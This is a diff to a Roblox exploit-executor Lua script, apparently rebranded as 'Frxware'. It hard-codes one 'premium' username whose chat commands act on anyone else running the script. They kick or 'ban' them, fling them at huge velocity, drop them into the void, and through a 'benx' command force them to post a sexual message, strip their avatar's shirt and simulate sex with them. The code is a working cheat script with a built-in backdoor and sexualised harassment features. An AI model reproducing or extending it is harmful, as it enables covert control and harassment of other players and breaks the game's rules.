@@ -1,5 +1,6 @@
 --// Premium User //--
-local user_premium__001 = game.Players.XxStarPlayer_xX --// Replace "User101" with your username (NOT DISPLAY) //--
+
+local user_premium__001 = game.Players.wfrxsry --// Replace "User101" with your username (NOT DISPLAY) //--
 
 -----------------------------------------------------------------------
 -----------------------------------------------------------------------
@@ -46,13 +47,13 @@ end
 
 local unfreeze = function()
 	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
-	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = false
 end
 
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":kick .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+			game.Players.LocalPlayer:Kick("Kicked by Premium user\nFrxware")
 		end
 	end
 
@@ -62,7 +63,7 @@ user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":fling .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
-			power = 99999999 -- change this to make it more or less powerful
+			power = 9999999999999999999999 -- change this to make it more or less powerful
  
 			game:GetService('RunService').Stepped:connect(function()
 			game.Players.LocalPlayer.Character.Head.CanCollide = false
@@ -83,7 +84,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":benx .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			wait(0) local A_1 = "Yeah Yeah!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			wait(0) local A_1 = "mfphhhh~~~~" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
 			local benxed = true
 			while benxed == true do
@@ -95,9 +96,9 @@ user_premium__001.Chatted:connect(function(cht)
     					hummy.Parent.Shirt:Destroy()
 				end)
 				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = user_premium__001.Character.HumanoidRootPart.CFrame + user_premium__001.Character.HumanoidRootPart.CFrame.lookVector * 0.5
-				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 20
 				wait(0.1)
-				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -20
 			end
 		end
 	end
@@ -146,7 +147,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":ban .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			game.Players.LocalPlayer:kick("PERMA BAN")
+			game.Players.LocalPlayer:kick("Banned by a premium user\nFrxware")
 		end
 	end
 
@@ -226,7 +227,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":kick me") then
 		if game.Players.LocalPlayer == user_premium__001 then
-			game.Players.LocalPlayer:Kick("Kicked yourself")
+			game.Players.LocalPlayer:Kick("Kicked yourself\nFrxware")
 		end
 	end
 
@@ -264,9 +265,10 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":cmds") then
 		if game.Players.LocalPlayer == user_premium__001 then
+				rconsoleprint(":freeze .  : freeze a player \n:grave .  : put a user underground \n:benx . : fvck a player\n:bring .  : brint user to you \n:void .  : put player in the void\n :kill .  : kill a player \n :kick . : kick a player\n:ban .  : ban a player \n:fling .  : fling a player !")
 game:GetService("StarterGui"):SetCore("SendNotification",{
 	Title = "Cmds:";
-	Text = ":Freeze :grave :benx :bring :void :kill :kick :ban :fling";
+	Text = "Check the console !";
 	Time = 50;
 	Icon = "rbxassetid://505845268";
 })
